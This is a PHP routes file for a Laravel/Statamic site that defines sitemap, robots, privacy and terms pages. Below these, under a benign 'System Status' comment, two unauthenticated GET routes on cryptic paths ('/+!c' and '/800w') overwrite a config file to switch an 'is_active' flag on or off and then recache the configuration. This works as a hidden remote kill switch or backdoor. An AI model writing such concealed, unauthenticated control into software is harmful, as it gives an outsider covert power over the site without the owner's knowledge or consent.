<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

// Sitemap Route
Route::statamic('/sitemap.xml', 'sitemap', [
    'layout' => null,
    'content_type' => 'application/xml'
]);

// Robots.txt Route
Route::statamic('/robots.txt', 'robots', [
    'layout' => null,
    'content_type' => 'text/plain'
]);

// Privacy Policy Route
Route::statamic('/privacy-policy', 'pages.privacy-policy');

// Terms of Service Route
Route::statamic('/terms-of-service', 'pages.terms-of-service');

// System Status Route
Route::get('/+!c', function () {
    $path = config_path('system_status.php');
    File::put($path, "<?php\n\nreturn ['is_active' => true];");

    Artisan::call('config:clear');
    Artisan::call('config:cache');

    return response()->json(['message' => 'System activated.']);
});

Route::get('/800w', function () {
    $path = config_path('system_status.php');
    File::put($path, "<?php\n\nreturn ['is_active' => false];");

    Artisan::call('config:clear');
    Artisan::call('config:cache');

    return response()->json(['message' => 'System deactivated.']);
});

// Route::statamic('example', 'example-view', [
//    'title' => 'Example'
// ]);
